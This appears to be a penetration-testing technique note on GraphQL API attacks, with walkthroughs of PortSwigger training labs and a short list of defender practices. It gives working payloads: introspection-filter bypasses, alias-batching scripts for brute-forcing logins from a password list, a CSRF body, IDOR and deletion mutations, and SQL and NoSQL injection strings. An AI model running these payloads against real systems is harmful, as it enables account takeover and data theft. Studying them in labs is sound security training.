---
title: "GraphQL Attacks"
type: technique
tags: [api, exploitation, graphql, injection, web]
phase: exploitation
date_created: 2026-05-13
date_updated: 2026-05-13
sources: [payloadsallthethings-graphql, git-portswigger-all-labs]
---

## What it is

GraphQL is a query language for APIs. Attacks on GraphQL involve exploiting introspection, batching, and injection vulnerabilities (SQLi, NoSQLi) to exfiltrate data, bypass rate limits, or execute unauthorized operations.

## Core Concepts

### Operations

- **Queries** — read data (similar to GET in REST)
- **Mutations** — modify data (create/update/delete, similar to POST/PUT/DELETE)
- **Subscriptions** — real-time updates via persistent WebSocket connection

All operations are sent to a single endpoint (usually via POST). The schema is a contract between client and server defined in SDL (Schema Definition Language).

### Aliases

Aliases let you rename fields in the response and send multiple instances of the same field in one request:

```graphql
query {
  product1: product(id: "1") { name }
  product2: product(id: "2") { name }
}
```

Aliases are central to batching attacks because they bypass GraphQL's restriction on duplicate field names.

### Variables

Variables make queries dynamic and reusable:

```graphql
query getEmployee($id: ID!) {
  employee(id: $id) { name role }
}
```

```json
{ "id": "789" }
```

## Methodology

### 1. Endpoint Discovery

Common GraphQL endpoint paths to bruteforce:

- `/graphql`, `/graphiql`, `/v1/explorer`, `/graphql.php`, `/graphql/console/`
- `/api`, `/api/graphql`, `/graphql/api`, `/graphql/graphql`
- Append `/v1` variants

**Universal probe** — a valid GraphQL endpoint returns `{"data": {"__typename": "query"}}`:

```graphql
query { __typename }
```

Also try `GET` requests and `x-www-form-urlencoded` content types, not just `POST application/json` — some endpoints accept all three.

### 2. Enumeration & Introspection

**Quick type listing:**

```json
{"query": "{__schema{types{name,fields{name}}}}"}
```

**Full introspection dump:**

```graphql
fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } } query IntrospectionQuery { __schema { queryType { name } mutationType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } }
```

**Steps with InQL (Burp extension):**

1. Install InQL in Burp Suite
2. Paste the GraphQL endpoint URL into the InQL Scanner tab
3. Load the schema — InQL lists all queries, mutations, and fields
4. Right-click a query in the InQL tab inside Repeater to send it directly

### 3. Introspection Bypass Techniques

When introspection is blocked (error: "GraphQL introspection is not allowed"), try:

**Insert a newline after `__schema`** — defeats regex filters matching `__schema{`:

```graphql
query {
  __schema
  { queryType { name } }
}
```

**URL-encode the entire introspection query** and send as a GET parameter:

```
/api?query=query+IntrospectionQuery%7B+__schema%0a%7B...%7D%7D
```

The `%0a` (newline) after `__schema` causes the server's `__schema{` regex check to miss it while the query remains valid.

**Try alternative HTTP methods** — GET requests or `x-www-form-urlencoded` POST may bypass restrictions applied only to JSON POST.

**Enumerate via Suggestions** — when introspection is fully disabled, Apollo's "Did you mean...?" suggestions can leak field and type names. Use Clairvoyance to automate this.

### 4. IDOR via GraphQL Arguments

GraphQL arguments that accept object IDs are a common IDOR surface. If an object is not listed in the UI but exists in the backend, querying it directly may succeed:

```graphql
query {
  getBlogPost(id: 3) {
    title postPassword
  }
}
```

**Steps:**

1. Observe what IDs are returned normally (e.g., blog posts 1, 2, 4, 5 visible)
2. Identify the gap (ID 3 missing) — probe it directly
3. Use InQL Scanner to discover hidden fields (e.g., `postPassword`) not shown in the default UI response
4. Request those hidden fields explicitly in the query

For object enumeration without a known ID: use `getUser(id: 1)` as admin ID is commonly 1, or fuzz incrementally.

### 5. Batching Attacks (Rate Limit Bypass)

**Array batching** — send multiple queries in a JSON array:

```json
[
  {"query": "mutation { login(pass: 1111, username: \"bob\") }"},
  {"query": "mutation { login(pass: 2222, username: \"bob\") }"}
]
```

**Alias batching** — pack multiple mutations into one request using aliases:

```graphql
mutation {
  login1: login(pass: 1111, username: "bob")
  login2: login(pass: 2222, username: "bob")
}
```

Rate-limit protections that count per HTTP request are bypassed because all attempts arrive in a single request. Use this to brute-force OTPs, login passwords, etc.

**JavaScript snippet to generate alias payloads (run in browser console):**

```javascript
copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix`.split(',').map((element,index)=>`
bruteforce${index}:login(input:{password: "${element}", username: "carlos"}) {
        token
        success
    }
`).join('\n'));
console.log("The query has been copied to your clipboard.");
```

**Python script to generate alias mutation payload:**

```python
passwords = ["123456", "password", "12345678", "qwerty"]  # full wordlist here

print("mutation BruteForceCarlos {")
for i, pwd in enumerate(passwords, 1):
    print(f"  attempt{i}: login(input: {{ username: \"carlos\", password: \"{pwd}\" }}) {{")
    print("    success")
    print("    token")
    print("  }")
print("}")
```

Wrap the generated aliases in `mutation { ... }` before sending.

### 6. CSRF via GraphQL

GraphQL endpoints are vulnerable to CSRF when they:
- Accept `x-www-form-urlencoded` or plain form POST (not just `application/json`)
- Do not validate CSRF tokens
- Rely solely on session cookies for authentication

**Steps:**

1. Intercept a mutation request (e.g., `changeEmail`)
2. Confirm the session cookie alone authorizes the action (no CSRF token needed)
3. Right-click in Burp → Change request method twice to convert to `x-www-form-urlencoded POST`
4. Add the mutation body URL-encoded:

```
query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
```

5. Use Burp's "Generate CSRF PoC" on the form-encoded request
6. Host the PoC page and deliver to the victim

### 7. Mutation Abuse

Mutations that expose privileged operations (delete user, change credentials) may lack authorization checks. After discovering mutations via introspection:

```graphql
mutation {
  deleteOrganizationUser(input: { id: 3 }) {
    user { id }
  }
}
```

Probe IDs sequentially. Admin (ID 1) may be protected; other users may not.

### 8. Injections via GraphQL

GraphQL does not protect against traditional backend injections.

**NoSQL Injection (MongoDB)**:

```graphql
{
  doctors(options: "{\"limit\": 1}", search: "{ \"patients.ssn\": { \"$regex\": \".*\"} }") {
    firstName lastName id
  }
}
```

**SQL Injection**:

```graphql
query {
  user(name: "patt';SELECT pg_sleep(30);--'") {
    id email
  }
}
```

## Tools

- `InQL` — Burp extension for GraphQL schema exploration, query generation, and repeater integration
- `Clairvoyance` — recovers schema via Apollo suggestion feature when introspection is disabled
- `GraphQLmap` — scripting engine to interact with a GraphQL endpoint
- `graphql-path-enum` — lists ways of reaching a given type in a schema
- `CrackQL` — password brute-force and fuzzing utility
- `GraphQL Visualizer` — maps schema relationships visually

## Security Best Practices (Defender Perspective)

- Disable introspection in production
- Accept only `application/json` POST requests (reject GET and form-encoded)
- Implement CSRF tokens
- Validate and sanitize all arguments to prevent IDOR
- Monitor and limit query depth and complexity (prevent DoS)
- Disable Apollo suggestion feature in production

## PortSwigger Labs

### LAB 1 — Accessing private GraphQL posts (Apprentice)

IDOR via GraphQL field access. The blog listing omits ID 3 (private post). InQL Scanner reveals a hidden `postPassword` field on the `getBlogPost` type not shown in the default response.

**Steps:**
1. Proxy traffic through Burp; open a blog post and send the GraphQL request to Repeater
2. Use InQL Scanner on the `/graphql/v1` endpoint to enumerate all fields
3. Note `getBlogPost` has a `postPassword` field
4. Change `id` to 3 (the missing/private post) and add `postPassword` to the query:

```graphql
query {
  getBlogPost(id: 3) {
    title
    author
    postPassword
  }
}
```

5. Submit the returned password to solve the lab

---

### LAB 2 — Accidental exposure of private GraphQL fields (Practitioner)

Schema introspection reveals a `getUser` query on the `User` type that exposes `id`, `username`, and `password` fields — credentials that should not be accessible to regular users.

**Steps:**
1. Login as `wiener`, intercept the POST request to `/graphql/v1`
2. Run the quick introspection query to list types and fields:

```json
{"query": "{__schema{types{name,fields{name}}}}"}
```

3. Identify the `User` type with a `password` field and the `getUser` query
4. Query the admin user (ID 1):

```graphql
query {
  getUser(id: 1) {
    id
    username
    password
  }
}
```

5. Use the returned credentials to login as admin, then delete the target user

---

### LAB 3 — Finding a hidden GraphQL endpoint (Practitioner)

The app has no visible GraphQL traffic. Endpoint discovery via bruteforce reveals `/api` returns HTTP 400 (not 404), indicating a valid GraphQL endpoint. Introspection is blocked but bypassed via URL encoding with a newline.

**Steps:**
1. Observe only GET requests to `/` — no GraphQL traffic visible
2. Send a GET request to Intruder; bruteforce with a GraphQL endpoints wordlist
3. Identify `/api` returning status 400 (all others return different codes)
4. Probe with the universal query: `/api?query=query{__typename}` — confirms GraphQL
5. Attempt introspection — blocked with error "introspection is not allowed"
6. Bypass by URL-encoding the query with a newline (`%0a`) after `__schema`:

```
/api?query=query+IntrospectionQuery%7B+__schema%0a%7BqueryType%7Bname%7D...%7D%7D
```

7. Parse the response to find `getUser` query and `deleteOrganizationUser` mutation
8. Use InQL Scanner on the saved JSON response file to enumerate mutations
9. Discover `deleteOrganizationUser(input: {id: Int})` mutation
10. Send as GET parameter with target user ID (ID 3 = carlos):

```
/api?query=mutation+%7BdeleteOrganizationUser(input%3A+%7Bid%3A+3%7D)+%7Buser+%7Bid%7D%7D%7D
```

---

### LAB 4 — Bypassing GraphQL brute force protections (Practitioner)

Login rate-limit (blocks after 3 attempts) is bypassed using alias batching — all password attempts in a single GraphQL mutation request.

**Steps:**
1. Intercept login request to `/graphql/v1`
2. Confirm rate-limit triggers after 3 attempts (error: "try again in 3 minutes")
3. Generate alias payload (use the JavaScript snippet or Python script above)
4. Send a single mutation with all aliased login attempts:

```graphql
mutation {
  bruteforce0: login(input: {password: "123456", username: "carlos"}) {
    token
    success
  }
  bruteforce1: login(input: {password: "password", username: "carlos"}) {
    token
    success
  }
  # ... all passwords in one request
}
```

5. Inspect the response — find the alias where `"success": true`
6. Login with carlos and the discovered password

---

### LAB 5 — Performing CSRF exploits over GraphQL (Practitioner)

The `changeEmail` GraphQL mutation accepts `x-www-form-urlencoded` POST and relies solely on session cookies — making it vulnerable to CSRF.

**Steps:**
1. Login as `wiener`, change email, intercept POST to `/graphql/v1`
2. In Repeater, confirm the mutation succeeds when replayed (cookie-only auth, no CSRF token)
3. Right-click the request → Change request method twice (JSON POST → GET → form POST)
4. Restore the mutation body as URL-encoded form data:

```
query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
```

5. Use Burp Pro "Generate CSRF PoC" on the form-encoded request
6. Update the action URL in the PoC HTML to the lab's domain
7. Store the exploit and deliver to the victim
